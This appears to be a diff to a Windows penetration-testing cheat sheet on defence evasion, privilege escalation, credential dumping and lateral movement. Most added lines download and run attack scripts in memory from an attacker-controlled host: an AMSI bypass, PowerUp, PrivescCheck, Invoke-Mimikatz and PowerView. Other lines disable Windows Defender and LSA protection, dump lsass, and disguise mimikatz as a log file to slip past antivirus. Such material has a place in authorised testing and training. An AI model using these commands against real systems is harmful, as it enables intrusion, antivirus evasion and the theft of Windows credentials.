@@ -150,6 +150,9 @@ reg query HKCU /f password /t REG_SZ /s
 
 # Evasion
 
+- Show AV installed
+PS C:\> Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct
+
 Disable Windows Defender Behavior Monitoring.
 Set the Severe Threat default action to ‘Allow’.
 Disable Realtime Monitoring.
@@ -170,16 +173,10 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
 reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f
 
 - Bypass AMSI
-Kali
 cd /opt/Nishang/Bypass/
 python3 -m http.server 80
-
-Target
-Open Command Prompt
-powershell -nop -exe bypass
-curl http://kali IP/Invoke-AmsiBypass.ps1 -o test.ps1
-Import-Module .\test.ps1
-Invoke-AmsiBypass -Verbose
+powershell -nop -exec bypass
+iex (iwr -UseBasicParsing http://172.16.219.133/Invoke-AmsiBypass.ps1); Invoke-AmsiBypass -Verbose
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Persistence
@@ -191,7 +188,6 @@ net localgroup Administrators <user> /add
 - Autorun registry keys
 
 - Scheduled task
-
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Privilege Escalation
@@ -211,17 +207,21 @@ Watson.exe
 winPEAS.exe cmd
 
 - PowerShell
-/usr/share/windows-resources/powersploit/Privesc/
-powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
+cd /usr/share/windows-resources/powersploit/Privesc/
+python3 -m http.server 80
+powershell -nop -exec bypass
+iex (iwr -UseBasicParsing http://172.16.219.133/PowerUp.ps1); Invoke-AllChecks
 
-/opt/PrivescCheck/
-powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
+cd /opt/PrivescCheck/
+python3 -m http.server 80
+powershell -nop -exec bypass
+iex (iwr -UseBasicParsing http://172.16.219.133/PrivescCheck.ps1); Invoke-PrivescCheck
 
 - Python
 /opt/Windows-Exploit-Suggester-NG
 ./wes.py --update
 systeminfo > systeminfo.txt
-Transfer the file to Kali.
+Transfer the file to Kali with scp.
 ./wes.py systeminfo.txt
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
@@ -239,7 +239,7 @@ if ($DevGuard.SecurityServicesRunning -contains 1) {"Credential Guard running"}
 
 - GUI access
 Open the Task Manager > Details > right click on lsass.exe > Create dump file
-Transfer the dump to a Kali VM using scp.
+Transfer the dump to Kali with scp.
 pypykatz lsa dump lsass.dmp
 
 - ProcDump
@@ -254,10 +254,9 @@ procdump.exe -accepteula -ma <PID> lsass.dmp
 - PowerSploit
 cp /usr/share/windows-resources/powersploit/Exfiltration/Out-Minidump.ps1 .
 Edit the file by removing the usage (lines 3-68).
-Transfer the file to the target.
+python3 -m http.server
 Open PowerShell as Administrator.
-. .\Out-Minidump.ps1
-Get-Process lsass | Out-Minidump
+iex (iwr -UseBasicParsing http://172.16.219.133/mod-Out-Minidump.ps1); Get-Process lsass | Out-Minidump
 
 - CME
 crackmapexec smb <target IP> -u <admin user> -p <password> --lsa
@@ -274,13 +273,22 @@ sekurlsa::minidump C:\Users\joe\debug<PID>
 sekurlsa::logonPasswords
 
 - mimikatz.exe
-/usr/share/windows-resources/mimikatz/x64/
-Transfer file to target.
 Rename mimikatz.exe to DumbStack.log to bypass Windows Defender.
+cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe DumbStack.log
+python3 -m http.server
+curl http://172.16.219.133/DumbStack.log -o DumbStack.log
 DumbStack.log
 sekurlsa::minidump lsass.dmp
 log lsass.txt
 sekurlsa::logonPasswords
+
+- PowerShell version of mimikatz
+cd /opt/Nishang/Gather/
+python3 -m http.server 80
+powershell -nop -exec bypass
+Run AMSI bypass from above.
+iex (iwr -UseBasicParsing http://172.16.219.133/Invoke-Mimikatz.ps1); Invoke-Mimikatz -Command privilege::debug
+iex (iwr -UseBasicParsing http://172.16.219.133/Invoke-Mimikatz.ps1); Invoke-Mimikatz -Command sekurlsa::logonpasswords
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Lateral Movement
@@ -298,3 +306,8 @@ Gather/Invoke-Mimikatz.ps1
 Invoke-Mimikatz
 evil-winrm -i <target IP> -u <user> -H <hash>
 
+- Find open file shares
+cd /usr/share/windows-resources/powersploit/Recon/
+python3 -m http.server 80
+powershell -nop -exec bypass
+iex (iwr -UseBasicParsing http://172.16.219.133/PowerView.ps1); Invoke-ShareFinder -CheckShareAccess
